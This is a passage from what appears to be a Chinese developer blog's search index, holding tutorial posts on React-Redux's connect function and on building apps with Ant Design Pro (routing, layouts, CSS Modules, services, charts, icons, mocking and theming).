styled-components样式*/&#125;          &lt;style&gt;&#123;this.props.styleTags&#125;&lt;/style&gt;        &lt;/Head&gt;        &lt;body&gt;          &#123;this.props.customValue&#125;          &lt;Main /&gt;          &lt;NextScript /&gt;        &lt;/body&gt;      &lt;/html&gt;    )  &#125;&#125;","categories":["框架"],"tags":["React"]},{"title":"React connect","url":"/2019/11/10/React/React-connect/","content":"一、connect用法\n作用：连接React组件与 Redux store\n\nconnect([mapStateToProps], [mapDispatchToProps], [mergeProps],[options])// 这个函数允许我们将 store 中的数据作为 props 绑定到组件上const mapStateToProps = (state) =&gt; &#123;  return &#123;    count: state.count  &#125;&#125;\n\n\n这个函数的第一个参数就是 Redux 的 store，我们从中摘取了 count 属性。你不必将 state 中的数据原封不动地传入组件，可以根据 state 中的数据，动态地输出组件需要的（最小）属性\n函数的第二个参数 ownProps，是组件自己的 props\n\n\n当 state 变化，或者 ownProps 变化的时候，mapStateToProps 都会被调用，计算出一个新的 stateProps，（在与 ownProps merge 后）更新给组件\n\nmapDispatchToProps(dispatch, ownProps): dispatchProps\n\n\nconnect` 的第二个参数是 `mapDispatchToProps`，它的功能是，将 `action` 作为 `props`绑定到组件上，也会成为 `MyComp` 的 `props\n\n二、原理解析\n首先connect之所以会成功，是因为Provider组件\n\n\n在原应用组件上包裹一层，使原来整个应用成为Provider的子组件\n接收Redux的store作为props，通过context对象传递给子孙组件上的connect\n\nconnect做了些什么\n\n它真正连接 Redux 和 React，它包在我们的容器组件的外一层，它接收上面 Provider提供的 store 里面的 state和 dispatch，传给一个构造函数，返回一个对象，以属性形式传给我们的容器组件\n\n三、源码\nconnect是一个高阶函数，首先传入mapStateToProps、mapDispatchToProps，然后返回一个生产Component的函数(wrapWithConnect)，然后再将真正的Component作为参数传入wrapWithConnect，这样就生产出一个经过包裹的Connect组件，该组件具有如下特点\n\n\n通过props.store获取祖先Component的store props包括stateProps、dispatchProps、parentProps,合并在一起得到nextState，作为props传给真正的Component\ncomponentDidMount时，添加事件this.store.subscribe(this.handleChange)，实现页面交互\nshouldComponentUpdate时判断是否有避免进行渲染，提升页面性能，并得到nextState\ncomponentWillUnmount时移除注册的事件this.handleChange\n\n// 主要逻辑export default function connect(mapStateToProps, mapDispatchToProps, mergeProps, options = &#123;&#125;) &#123;  return function wrapWithConnect(WrappedComponent) &#123;    class Connect extends Component &#123;      constructor(props, context) &#123;        // 从祖先Component处获得store        this.store = props.store || context.store        this.stateProps = computeStateProps(this.store, props)        this.dispatchProps = computeDispatchProps(this.store, props)        this.state = &#123; storeState: null &#125;        // 对stateProps、dispatchProps、parentProps进行合并        this.updateState()      &#125;      shouldComponentUpdate(nextProps, nextState) &#123;        // 进行判断，当数据发生改变时，Component重新渲染        if (propsChanged || mapStateProducedChange || dispatchPropsChanged) &#123;          this.updateState(nextProps)            return true          &#125;        &#125;        componentDidMount() &#123;          // 改变Component的state          this.store.subscribe(() = &#123;            this.setState(&#123;              storeState: this.store.getState()            &#125;)          &#125;)        &#125;        render() &#123;          // 生成包裹组件Connect          return (            &lt;WrappedComponent &#123;...this.nextState&#125; /&gt;          )        &#125;      &#125;      Connect.contextTypes = &#123;        store: storeShape      &#125;      return Connect;    &#125;&#125;","categories":["框架"],"tags":["React"]},{"title":"React-ant-Design-Pro总结","url":"/2019/12/25/React/React-ant-Design-Pro/","content":"一、简介1.1 ant pro系统特性\n基于 Ant Design 体系精心设计\n使用 React/umi/dva/antd 等前端前沿技术开发\n针对不同屏幕大小设计\n可配置的主题满足多样化的品牌诉求\nMock 数据实用的本地数据调试方案\n\n1.2 模板- Dashboard  - 分析页  - 监控页  - 工作台- 表单页  - 基础表单页  - 分步表单页  - 高级表单页- 列表页  - 查询表格  - 标准列表  - 卡片列表  - 搜索列表（项目/应用/文章）- 详情页  - 基础详情页  - 高级详情页- 结果  - 成功页  - 失败页- 异常  - 403 无权限  - 404 找不到  - 500 服务器出错- 个人页  - 个人中心  - 个人设置- 帐户  - 登录  - 注册  - 注册成功\n\n1.3 使用$ git clone --depth=1 https://github.com/ant-design/ant-design-pro.git my-project$ cd my-project\n\n或者\n$ npm install ant-design-pro-cli -g$ mkdir my-project &amp;&amp; cd my-project$ pro new  # 安装脚手架\n\n1.4 目录结构整个项目的目录结构\n├── mock                     # 本地模拟数据├── node_modules             # 依赖库├── public│   ├── favicon.ico          # Favicon│   └── index.html           # HTML 入口模板├── src│   ├── common               # 应用公用配置，如导航信息│   ├── components           # 业务通用组件│   ├── e2e                  # 集成测试用例│   ├── layouts              # 通用布局│   ├── models               # dva model│   ├── routes               # 业务页面入口和常用模板│   ├── services             # 后台接口服务│   ├── utils                # 工具库│   ├── g2.js                # 可视化图形配置│   ├── polyfill.js          # 兼容性垫片│   ├── theme.js             # 主题配置│   ├── index.js             # 应用入口│   ├── index.less           # 全局样式│   └── router.js            # 路由入口├── tests                    # 测试工具├── .editorconfig            # 编辑器配置├── .eslintrc                # js代码检测工具├── .ga                      # 未知├── .gitignore               # git版本配置├── .roadhogrc               # roadhog配置├── .roadhogrc.mock.js       # roadhog的模拟配置├── .stylelintrc             # css代码审查配置├── .travis.yml              # travis持续构建工具配置├── package.json             # web前端项目配置文件├── README.md└──\n\nroadhog摘要介绍\nroadhog 是一个 cli 工具，提供 server、 build 和 test 三个命令，分别用于本地调试和构建，并且提供了特别易用的 mock 功能。命令行体验和 create-react-app 一致，配置略有不同，比如默认开启 css``modules，然后还提供了 JSON 格式的配置方式。\n重点介绍roadhog有关的几个配置项，主要是在ant design pro的代码中用到了这些配置项\n\nentry\n\n指定 webpack 入口文件，支持 glob格式。\n如果你的项目是多页类型，会希望把 src/pages的文件作为入口。可以这样配：\n\n&quot;entry&quot;: &quot;src/pages/\\*.js&quot;\n\nenv\n\n针对特定的环境进行配置。server 的环境变量是 development，build 的环境变量是production。\n\n比如：\n&quot;extraBabelPlugins&quot;: [&quot;transform-runtime&quot;],&quot;env&quot;: &#123;  &quot;development&quot;: &#123;    &quot;extraBabelPlugins&quot;: [&quot;dva-hmr&quot;]  &#125;&#125;\n\n\n这样，开发环境下的 extraBabelPlugins 是 [&quot;transform-runtime&quot;, &quot;dva-hmr&quot;]，而生产环境下是 [&quot;transform-runtime&quot;]。\n\n&quot;env&quot;: &#123;  &quot;development&quot;: &#123;    &quot;extraBabelPlugins&quot;: [      &quot;dva-hmr&quot;,      &quot;transform-runtime&quot;,      &quot;transform-decorators-legacy&quot;,      &quot;transform-class-properties&quot;,      [&quot;import&quot;, &#123; &quot;libraryName&quot;: &quot;antd&quot;, &quot;style&quot;: true &#125;]    ]  &#125;,  &quot;production&quot;: &#123;    &quot;extraBabelPlugins&quot;: [      &quot;transform-runtime&quot;,      &quot;transform-decorators-legacy&quot;,      &quot;transform-class-properties&quot;,      [&quot;import&quot;, &#123; &quot;libraryName&quot;: &quot;antd&quot;, &quot;style&quot;: true &#125;]    ]  &#125;&#125;\n\n\n在这段代码中，开发环境和生产环境分别配置，其中开发环境使用了dva-hmr插件\n\n二、布局\n页面整体布局是一个产品最外层的框架结构，往往会包含导航、页脚、侧边栏、通知栏以及内容等。在页面之中，也有很多区块的布局结构。在真实项目中，页面布局通常统领整个应用的界面，有非常重要的作用\n\n2.1 Ant Design Pro 的布局\n在 Ant Design Pro 中，我们抽离了使用过程中的通用布局，都放在 layouts 目录中，分别为\n\nBasicLayout：基础页面布局，包含了头部导航，侧边栏和通知栏\n\nUserLayout：抽离出用于登陆注册页面的通用布局\n\nBlankLayout：空白的布局\n2.2 如何使用 Ant Design Pro 布局\n通常布局是和路由系统紧密结合的，Ant Design Pro 的路由使用了 Umi 的路由方案，为了统一方便的管理路由和页面的关系，我们将配置信息统一抽离到 config/router.config.js 下，通过如下配置定义每个页面的布局\n\nmodule.exports = [&#123;  path: &#x27;/&#x27;,  component: &#x27;../layouts/BasicLayout&#x27;,  // 指定以下页面的布局  routes: [    // dashboard    &#123; path: &#x27;/&#x27;, redirect: &#x27;/dashboard/analysis&#x27; &#125;,    &#123;      path: &#x27;/dashboard&#x27;,      name: &#x27;dashboard&#x27;,      icon: &#x27;dashboard&#x27;,      routes: [        &#123; path: &#x27;/dashboard/analysis&#x27;, name: &#x27;analysis&#x27;, component: &#x27;./Dashboard/Analysis&#x27; &#125;,        &#123; path: &#x27;/dashboard/monitor&#x27;, name: &#x27;monitor&#x27;, component: &#x27;./Dashboard/Monitor&#x27; &#125;,        &#123; path: &#x27;/dashboard/workplace&#x27;, name: &#x27;workplace&#x27;, component: &#x27;./Dashboard/Workplace&#x27; &#125;,      ],    &#125;,  ],&#125;]\n\n\n更多 Umi 的路由配置方式可以参考：Umi 配置式路由\n\n2.3 Pro 扩展配置\n我们在 router.config.js 扩展了一些关于 pro 全局菜单的配置\n\n&#123;  name: &#x27;dashboard&#x27;,  icon: &#x27;dashboard&#x27;,  hideInMenu: true,  hideChildrenInMenu: true,  hideInBreadcrumb: true,  authority: [&#x27;admin&#x27;],&#125;\n\n\nname: 当前路由在菜单和面包屑中的名称，注意这里是国际化配置的 key，具体展示菜单名可以在 /src/locales/zh-CN.js 进行配置。\nicon: 当前路由在菜单下的图标名。\nhideInMenu: 当前路由在菜单中不展现，默认 false。\nhideChildrenInMenu: 当前路由的子级在菜单中不展现，默认 false。\nhideInBreadcrumb: 当前路由在面包屑中不展现，默认 false。\nauthority: 允许展示的权限，不设则都可见，详见：权限管理\n\n2.4 Ant Design 布局组件\n除了 Pro 里的内建布局以为，在一些页面中需要进行布局，可以使用 Ant Design 目前提供的两套布局组件工具：Layout 和 Grid\n\nGrid 组件\n\n\n栅格布局是网页中最常用的布局，其特点就是按照一定比例划分页面，能够随着屏幕的变化依旧保持比例，从而具有弹性布局的特点。\n而 Ant Design 的栅格组件提供的功能更为强大，能够设置间距、具有支持响应式的比例设置，以及支持 flex 模式，基本上涵盖了大部分的布局场景 https://ant.design/components/grid/\n\n\nLayout 组件\n\n如果你需要辅助页面框架级别的布局设计，那么 Layout 则是你最佳的选择，它抽象了大部分框架布局结构，使得只需要填空就可以开发规范专业的页面整体布局 https://ant.design/components/layout-cn/\n\n\n根据不同场景区分抽离布局组件#在大部分场景下，我们需要基于上面两个组件封装一些适用于当下具体业务的组件，包含了通用的导航、侧边栏、顶部通知、页面标题等元素。例如 Ant Design Pro 的 BasicLayout。\n通常，我们会把抽象出来的布局组件，放到跟 pages、 components 平行的 layouts 文件夹中方便管理。需要注意的是，这些布局组件和我们平时使用的其它组件并没有什么不同，只不过功能性上是为了处理布局问题\n\n四、路由和菜单\n路由和菜单是组织起一个应用的关键骨架，pro 中的路由为了方便管理，使用了中心化的方式，在 router.config.js 统一配置和管理\n\n4.1 基本结构\n路由管理 通过约定的语法根据在 router.config.js 中配置路由。\n菜单生成 根据路由配置来生成菜单。菜单项名称，嵌套路径与路由高度耦合。\n面包屑 组件 PageHeader 中内置的面包屑也可由脚手架提供的配置信息自动生成\n\n4.1.1 路由\n目前脚手架中所有的路由都通过 router.config.js 来统一管理，在 umi 的配置中我们增加了一些参数，如name,icon,hideChildren,authority，来辅助生成菜单。其中\n\n\nname 和 icon分别代表生成菜单项的图标和文本。\nhideChildren 用于隐藏不需要在菜单中展示的子路由。用法可以查看 分步表单 的配置。\nhideInMenu 可以在菜单中不展示这个路由，包括子路由。效果可以查看 exception/trigger页面。\nauthority 用来配置这个路由的权限，如果配置了将会验证当前用户的权限，并决定是否展示\n\n4.1.2 菜单\n菜单根据 router.config.js 生成，具体逻辑在 src/layouts/BasicLayout 中的 formatter 方法实现\n\n\n如果你的项目并不需要菜单，你可以直接在BasicLayout 中删除 SiderMenu 组件的挂载。并在 src/layouts/BasicLayout 中 设置 const MenuData = []。\n如果你需要从服务器请求菜单，可以将menuData设置为 state，然后通过网络获取来修改了 state\n\n4.1.3 面包屑\n面包屑由 PageHeaderLayout 实现，MenuContext 将 根据 MenuData 生成的 breadcrumbNameMap 通过props 传递给了 PageHeader，如果你要做自定义的面包屑，可以通过修改传入的 breadcrumbNameMap 来解决\n\nbreadcrumbNameMap 示例数据如下：\n&#123;  &#x27;/&#x27;: &#123; path: &#x27;/&#x27;, redirect: &#x27;/dashboard/analysis&#x27;, locale: &#x27;menu&#x27; &#125;,  &#x27;/dashboard/analysis&#x27;: &#123;    name: &#x27;analysis&#x27;,    component: &#x27;./Dashboard/Analysis&#x27;,    locale: &#x27;menu.dashboard.analysis&#x27;,  &#125;,  ...&#125;\n\n4.2 需求实例4.2.1 新增页面\n脚手架默认提供了两种布局模板：基础布局 - BasicLayout 以及 账户相关布局 - UserLayout\n\n\n\n如果你的页面可以利用这两种布局，那么只需要在路由配置中增加一条即可\n // app  &#123;    path: &#x27;/&#x27;,    component: &#x27;../layouts/BasicLayout&#x27;,    routes: [      // dashboard      &#123; path: &#x27;/&#x27;, redirect: &#x27;/dashboard/analysis&#x27; &#125;,      &#123; path :&#x27;/dashboard/test&#x27;,component:&quot;./Dashboard/Test&quot;&#125;,    ...&#125;,\n\n\n加好后，会默认生成相关的路由及导航\n\n4.2.2 新增布局\n在脚手架中我们通过嵌套路由来实现布局模板。router.config.js 是一个数组，其中第一级数据就是我们的布局，如果你需要新增布局可以在直接增加一个新的一级数组\n\nmodule.exports = [   // user   &#123;    path: &#x27;/user&#x27;,    component: &#x27;../layouts/UserLayout&#x27;,    routes:[...]   &#125;,   // app   &#123;    path: &#x27;/&#x27;,    component: &#x27;../layouts/BasicLayout&#x27;,    routes:[...]   &#125;,   // new   &#123;    path: &#x27;/new&#x27;,    component: &#x27;../layouts/new_page&#x27;,    routes:[...]   &#125;,]\n\n4.2.3 带参数的路由\n脚手架默认支持带参数的路由,但是在菜单中显示带参数的路由并不是个好主意，我们并不会自动的帮你注入一个参数，你可能需要在代码中自行处理\n\n&#123;     path: &#x27;/dashboard/:page&#x27;,    hideInMenu:true,     name: &#x27;analysis&#x27;,     component: &#x27;./Dashboard/Analysis&#x27; &#125;,\n\n你可以通过以下代码来跳转到这个路由\nimport router from &#x27;umi/router&#x27;;router.push(&#x27;/dashboard/anyParams&#x27;)//orimport Link from &#x27;umi/link&#x27;;&lt;Link to=&quot;/dashboard/anyParams&quot;&gt;go&lt;/Link&gt;\n\n\n在路由组件中，可以通过this.props.match.params 来获得路由参数\n\n五、新增页面\n这里的『页面』指配置了路由，能够通过链接直接访问的模块，要新建一个页面，通常只需要在脚手架的基础上进行简单的配置\n\n5.1 新增 js、less\n在 src/pages 下新建页面的 js 及 less 文件，如果相关页面有多个，可以新建一个文件夹来放置相关文件\n\n\n\n样式文件默认使用 CSS Modules，如果需要，你可以在样式文件的头部引入 antd 样式变量文件\n\n@import &quot;~antd/lib/style/themes/default.less&quot;;\n\n5.2 将文件加入菜单和路由\n加入菜单和路由的方式请参照 路由和菜单 - 添加路由&#x2F;菜单 中的介绍完成。加好后，访问 http://localhost:8000/#/new 就可以看到新增的页面了 https://pro.ant.design/docs/router-and-nav-cn#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1/%E8%8F%9C%E5%8D%95\n\n\n5.3 新增 model、service\n布局及路由都配置好之后，回到之前新建的 NewPage.js，可以开始写业务代码了！如果需要用到 dva中的数据流，还需要在 src/models src/services 中建立相应的model 和 service，具体可以参考脚手架内置页面的写法\n\n六、新增业务组件\n对于一些可能被多处引用的功能模块，建议提炼成业务组件统一管理。这些组件一般有以下特征：\n\n\n只负责一块相对独立，稳定的功能；\n没有单独的路由配置；\n可能是纯静态的，也可能包含自己的 state，但不涉及 dva 的数据流，仅受父组件（通常是一个页面）传递的参数控制。\n\n新建文件\n\n在 src/components 下新建一个以组件名命名的文件夹，注意首字母大写，命名尽量体现组件的功能，这里就叫 ImageWrapper。在此文件夹下新增 js 文件及样式文件（如果需要），命名为 index.js和 index.less\n\n\n在使用组件时，默认会在 index.js 中寻找 export 的对象，如果你的组件比较复杂，可以分为多个文件，最后在 index.js中统一 export，就像这样\n\n// MainComponent.jsexport default (&#123; ... &#125;) =&gt; (...);// SubComponent1.jsexport default (&#123; ... &#125;) =&gt; (...);// SubComponent2.jsexport default (&#123; ... &#125;) =&gt; (...);// index.jsimport MainComponent from &#x27;./MainComponent&#x27;;import SubComponent1 from &#x27;./SubComponent1&#x27;;import SubComponent2 from &#x27;./SubComponent2&#x27;;MainComponent.SubComponent1 = SubComponent1;MainComponent.SubComponent2 = SubComponent2;export default MainComponent;\n\n你的代码大概是这个样子\n// index.jsimport React from &#x27;react&#x27;;import styles from &#x27;./index.less&#x27;;    // 按照 CSS Modules 的方式引入样式文件。export default (&#123; src, desc, style &#125;) =&gt; (  &lt;div style=&#123;style&#125; className=&#123;styles.imageWrapper&#125;&gt;    &lt;img className=&#123;styles.img&#125; src=&#123;src&#125; alt=&#123;desc&#125; /&gt;    &#123;desc &amp;&amp; &lt;div className=&#123;styles.desc&#125;&gt;&#123;desc&#125;&lt;/div&gt;&#125;  &lt;/div&gt;);// index.less.imageWrapper &#123;  padding: 0 20px 8px;  background: #f2f4f5;  width: 400px;  margin: 0 auto;  text-align: center;&#125;.img &#123;  vertical-align: middle;  max-width: calc(100% - 32px);  margin: 2.4em 1em;  box-shadow: 0 8px 20px rgba(143, 168, 191, 0.35);&#125;\n\n使用\n\n在要使用这个组件的地方，按照组件定义的 API 传入参数，直接使用就好，不过别忘了先引入\n\nimport React from &#x27;react&#x27;;import ImageWrapper from &#x27;@/components/ImageWrapper&#x27;;  // @ 表示相对于源文件根目录export default () =&gt; (  &lt;ImageWrapper    src=&quot;https://os.alipayobjects.com/rmsportal/mgesTPFxodmIwpi.png&quot;    desc=&quot;示意图&quot;  /&gt;);\n\n七、样式less\n\nAnt Design Pro 默认使用 less 作为样式语言\n\nCSS Modules\n在样式开发过程中，有两个问题比较突出\n\n全局污染 —— CSS 文件中的选择器是全局生效的，不同文件中的同名选择器，根据 build 后生成文件中的先后顺序，后面的样式会将前面的覆盖；\n选择器复杂 —— 为了避免上面的问题，我们在编写样式的时候不得不小心翼翼，类名里会带上限制范围的标识，变得越来越长，多人开发时还很容易导致命名风格混乱，一个元素上使用的选择器个数也可能越来越多。\n\n\n为了解决上述问题，我们的脚手架默认使用 CSS Modules 模块化方案，先来看下在这种模式下怎么写样式\n\n// example.jsimport styles from &#x27;./example.less&#x27;;export default (&#123; title &#125;) =&gt; &lt;div className=&#123;styles.title&#125;&gt;&#123;title&#125;&lt;/div&gt;;// example.less.title &#123;  color: @heading-color;  font-weight: 600;  margin-bottom: 16px;&#125;\n\n\n用 less 写样式好像没什么改变，只是类名比较简单（实际项目中也是这样），js 文件的改变就是在设置 className 时，用一个对象属性取代了原来的字符串，属性名跟 less 文件中对应的类名相同，对象从 less 文件中引入。\n在上面的样式文件中，.title 只会在本文件生效，你可以在其他任意文件中使用同名选择器，也不会对这里造成影响。不过有的时候，我们就是想要一个全局生效的样式呢？可以使用 :global\n\n// example.less.title &#123;  color: @heading-color;  font-weight: 600;  margin-bottom: 16px;&#125;/* 定义全局样式 */:global(.text) &#123;  font-size: 16px;&#125;/* 定义多个全局样式 */:global &#123;  .footer &#123;    color: #ccc;  &#125;  .sider &#123;    background: #ebebeb;  &#125;&#125;\n\n\nCSS Modules 的基本原理很简单，就是对每个类名（非 :global 声明的）按照一定规则进行转换，保证它的唯一性。如果在浏览器里查看这个示例的 dom 结构，你会发现实际渲染出来是这样的\n\n&lt;div class=&quot;title___3TqAx&quot;&gt;title&lt;/div&gt;\n\n\n类名被自动添加了一个 hash 值，这保证了它的唯一性\n\n样式文件类别\n\n在一个项目中，样式文件根据功能不同，可以划分为不同的类别\n\n\nsrc/index.less#\n\n\n全局样式文件，在这里你可以进行一些通用设置，比如脚手架中自带的\n\nhtml, body, :global(#root) &#123;  height: 100%;&#125;body &#123;  text-rendering: optimizeLegibility;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;&#125;// temporary font size patch:global(.ant-tag) &#123;  font-size: 12px;&#125;\n\n\nsrc/utils/utils.less#\n\n\n这里可以放置一些工具函数供调用，比如清除浮动 .clearfix\n\n\n模块样式\n\n\n针对某个模块&#x2F;页面生效的文件\n\n八、和服务端进行交互前端请求流程\n\n在 Ant Design Pro 中，一个完整的前端 UI 交互到服务端处理流程是这样的\n\n\nUI 组件交互操作；\n调用 model 的 effect；\n调用统一管理的 service 请求函数；\n使用封装的 request.js发送请求；\n获取服务端返回；\n然后调用reducer改变 state；\n更新 model\n\n\n为了方便管理维护，统一的请求处理都放在 services 文件夹中，并且一般按照 model 维度进行拆分文件\n\nservices/  user.js  api.js  ...\n\n\n其中，utils/request.js是基于 fetch 的封装，便于统一处理 POST，GET 等请求参数，请求头，以及错误提示信息等\n\n// services/user.jsimport request from &#x27;../utils/request&#x27;;export async function query() &#123;  return request(&#x27;/api/users&#x27;);&#125;export async function queryCurrent() &#123;  return request(&#x27;/api/currentUser&#x27;);&#125;// models/user.jsimport &#123; queryCurrent &#125; from &#x27;../services/user&#x27;;...effects: &#123;  *fetch(&#123; payload &#125;, &#123; call, put &#125;) &#123;    ...    const response = yield call(queryUsers);    ...  &#125;,&#125;\n\n处理异步请求\n\n在处理复杂的异步请求的时候，很容易让逻辑混乱，陷入嵌套陷阱，所以 Ant Design Pro 的底层基础框架 dva使用 effect 的方式来管理同步化异步请求\n\neffects: &#123;  *fetch(&#123; payload &#125;, &#123; call, put &#125;) &#123;    yield put(&#123;      type: &#x27;changeLoading&#x27;,      payload: true,    &#125;);    // 异步请求 1    const response = yield call(queryFakeList, payload);    yield put(&#123;      type: &#x27;save&#x27;,      payload: response,    &#125;);    // 异步请求 2    const response2 = yield call(queryFakeList2, payload);    yield put(&#123;      type: &#x27;save2&#x27;,      payload: response2,    &#125;);    yield put(&#123;      type: &#x27;changeLoading&#x27;,      payload: false,    &#125;);  &#125;,&#125;,\n\n九、引入外部模块\n除了antd组件以及脚手架内置的业务组件，有时我们还需要引入其他外部模块，这里以引入富文本组件 react-quill 为例进行介绍\n\n$ npm install react-quill --saveimport React from &#x27;react&#x27;;import &#123; Button, notification, Card &#125; from &#x27;antd&#x27;;import ReactQuill from &#x27;react-quill&#x27;; import &#x27;react-quill/dist/quill.snow.css&#x27;;export default class NewPage extends React.Component &#123;  state = &#123;    value: &#x27;test&#x27;,  &#125;;  handleChange = (value) =&gt; &#123;    this.setState(&#123;      value,    &#125;)  &#125;;  prompt = () =&gt; &#123;    notification.open(&#123;      message: &#x27;We got value:&#x27;,      description: &lt;span dangerouslySetInnerHTML=&#123;&#123; __html: this.state.value &#125;&#125;&gt;&lt;/span&gt;,    &#125;);  &#125;;  render() &#123;    return (      &lt;Card title=&quot;富文本编辑器&quot;&gt;        &lt;ReactQuill value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt;        &lt;Button style=&#123;&#123; marginTop: 16 &#125;&#125; onClick=&#123;this.prompt&#125;&gt;Prompt&lt;/Button&gt;      &lt;/Card&gt;    );  &#125;&#125;\n\n十、图表\nAnt Design Pro 提供了由设计师精心设计抽象的图表类型，是在 BizCharts 图表库基础上的二次封装，同时提供了业务中常用的图表套件，可以单独使用，也可以组合起来实现复杂的展示效果\n\n\n图表组件 https://pro.ant.design/components/Charts-cn/\n\n使用 Ant Design Pro 的图表\nCharts 图表套件是在 components/Charts 包中，引用到项目就像使用其它组件一样\nimport &#123; ChartCard, MiniBar &#125; from &#x27;@/components/Charts&#x27;;import &#123; Tooltip, Icon &#125; from &#x27;antd&#x27;;const visitData = [  &#123;    x: &quot;2017-09-01&quot;,    y: 100  &#125;,  &#123;    x: &quot;2017-09-02&quot;,    y: 120  &#125;,  &#123;    x: &quot;2017-09-03&quot;,    y: 88  &#125;,  &#123;    x: &quot;2017-09-04&quot;,    y: 65  &#125;];ReactDOM.render(  &lt;ChartCard    title=&quot;支付笔数&quot;    action=&#123;      &lt;Tooltip title=&quot;支付笔数反应交易质量&quot;&gt;        &lt;Icon type=&quot;exclamation-circle-o&quot; /&gt;      &lt;/Tooltip&gt;    &#125;    total=&quot;6,500&quot;    contentHeight=&#123;46&#125;  &gt;    &lt;MiniBar height=&#123;46&#125; data=&#123;visitData&#125; /&gt;  &lt;/ChartCard&gt;,  mountNode);\n\nhttps://github.com/alibaba/BizCharts\n使用 BizCharts 绘制图表\n\n如果 Ant Design Pro 不能满足你的业务需求，可以直接使用 BizCharts 封装自己的图表组件。\n\nnpm install bizcharts --saveimport &#123; Chart, Axis, Tooltip, Geom &#125; from &#x27;bizcharts&#x27;;const data = [...];&lt;Chart height=&#123;400&#125; data=&#123;data&#125; forceFit&gt;  &lt;Axis name=&quot;month&quot; /&gt;  &lt;Axis name=&quot;temperature&quot; label=&#123;&#123; formatter: val =&gt; `$&#123;val&#125;°C` &#125;&#125; /&gt;  &lt;Tooltip crosshairs=&#123;&#123; type : &quot;y&quot; &#125;&#125; /&gt;  &lt;Geom type=&quot;line&quot; position=&quot;month*temperature&quot; size=&#123;2&#125; color=&#123;&#x27;city&#x27;&#125; /&gt;  &lt;Geom type=&#x27;point&#x27; position=&quot;month*temperature&quot; size=&#123;4&#125; color=&#123;&#x27;city&#x27;&#125; /&gt;&lt;/Chart&gt;\n\n十一、业务图标\n通常情况下，你可以通过 Ant Design 提供的 &#96;&#96; 图标组件来使用 Ant Design 官方图标。基本使用方式如下：\n\n&lt;Icon type=&quot;heart&quot; style=&#123;&#123; fontSize: &#x27;16px&#x27;, color: &#x27;hotpink&#x27; &#125;&#125; /&gt;\n\n\n如果你没有在 Ant Design 官方图标中找到需要的图标，可以到 iconfont.cn 上采集并生成自己的业务图标库，再进行使用\n\n生成图标库代码\n\n首先，搜索并找到你需要的图标，将它采集到你的购物车里，在购物车里，你可以将选中的图标添加到项目中（没有的话，新建一个），后续生成的资源&#x2F;代码都是以项目为维度的。\n如果你已经有了设计稿，只是需要生成相关代码，可以上传你的图标后，再进行上面的操作\n\n\n\n来到刚才选中的项目页，点击『生成代码』的链接，会在下方生成不同引入方式的代码，下面会分别介绍\n\n\n引入\n\n有三种引入方式供你选择：SVG Symbol、Unicode 及 Font class。我们推荐在现代浏览器下使用 SVG Symbol方式引入。\n\n\nSVG 符号引入是现代浏览器未来主流的图标引入方式。其方法是预先加载符号，在合适的地方引入并渲染为矢量图形。有如下特点：\n\n\n支持多色图标，不再受到单色图标的限制\n通过一些技巧，支持像字体那样，通过 font-size、color 来调整样式\n支持IE 9+ 及现代浏览器\n\n\n切换到 Symbol 页签，复制项目生成的地址代码：\n\n//at.alicdn.com/t/font_405362_lyhvoky9rc7ynwmi.js\n\n加入图标样式代码，如果没有特殊的要求，你可以直接复用 Ant Design 图标的样式\n.icon &#123;  width: 1em;  height: 1em;  fill: currentColor;  vertical-align: -.125em;&#125;\n\n挑选相应图标并获取类名，应用于页面\n&lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot;&gt;    &lt;use xlink:href=&quot;#icon-ali-pay&quot;&gt;&lt;/use&gt;&lt;/svg&gt;\n\n你也可以通过使用 Ant Design 图标组件提供的 Icon.createFromIconfontCN(&#123;...&#125;) 方法来更加方便地使用图标，使用方式如下：\nimport &#123; Icon &#125; from &#x27;antd&#x27;;const IconFont = Icon.createFromIconfontCN(&#123;  scriptUrl: &#x27;//at.alicdn.com/t/font_405362_lyhvoky9rc7ynwmi.js&#x27;&#125;);export default IconFont;\n\n之后可以像使用 &#96;&#96; 组件一样方便地使用，支持配置样式\n&lt;IconFont type=&quot;icon-ali-pay&quot; style=&#123;&#123; fontSize: &#x27;16px&#x27;, color: &#x27;lightblue&#x27; &#125;&#125; /&gt;\n\n\n了解更多用法 https://pro.ant.design/docs/biz-icon-cn#%E4%BA%8C%E3%80%81%E5%BC%95%E5%85%A5\n\n十二、Mock 和联调\nMock 数据是前端开发过程中必不可少的一环，是分离前后端开发的关键链路。通过预先跟服务器端约定好的接口，模拟请求数据甚至逻辑，能够让前端开发独立自主，不会被服务端的开发所阻塞\n\n\n在 Ant Design Pro 中，因为我们的底层框架是 umi，而它自带了代理请求功能，通过代理请求就能够轻松处理数据模拟的功能\n\n使用 umi 的 mock 功能\n\numi 里约定 mock 文件夹下的文件即 mock 文件，文件导出接口定义，支持基于 require 动态分析的实时刷新，支持 ES6 语法，以及友好的出错提示\n\nexport default &#123;  // 支持值为 Object 和 Array  &#x27;GET /api/users&#x27;: &#123; users: [1, 2] &#125;,  // GET POST 可省略  &#x27;/api/users/1&#x27;: &#123; id: 1 &#125;,  // 支持自定义函数，API 参考 express@4  &#x27;POST /api/users/create&#x27;: (req, res) =&gt; &#123; res.end(&#x27;OK&#x27;); &#125;,&#125;;\n\n\n当客户端（浏览器）发送请求，如：GET /api/users，那么本地启动的 umi dev 会跟此配置文件匹配请求路径以及方法，如果匹配到了，就会将请求通过配置处理，就可以像样例一样，你可以直接返回数据，也可以通过函数处理以及重定向到另一个服务器\n\n了解更多 https://pro.ant.design/docs/mock-api-cn#%E4%BD%BF%E7%94%A8-umi-%E7%9A%84-mock-%E5%8A%9F%E8%83%BD\n十三、主题定制\n我们基于 Ant Design React 进行开发，完全支持官方提供的 less 变量定制功能. 你可以在脚手架目录中找到 config/config.js 代码类似这样\n\n...theme: &#123;  &#x27;font-size-base&#x27;: &#x27;14px&#x27;,  &#x27;badge-font-size&#x27;: &#x27;12px&#x27;,  &#x27;btn-font-size-lg&#x27;: &#x27;@font-size-base&#x27;,  &#x27;menu-dark-bg&#x27;: &#x27;#00182E&#x27;,  &#x27;menu-dark-submenu-bg&#x27;: &#x27;#000B14&#x27;,  &#x27;layout-sider-background&#x27;: &#x27;#00182E&#x27;,  &#x27;layout-body-background&#x27;: 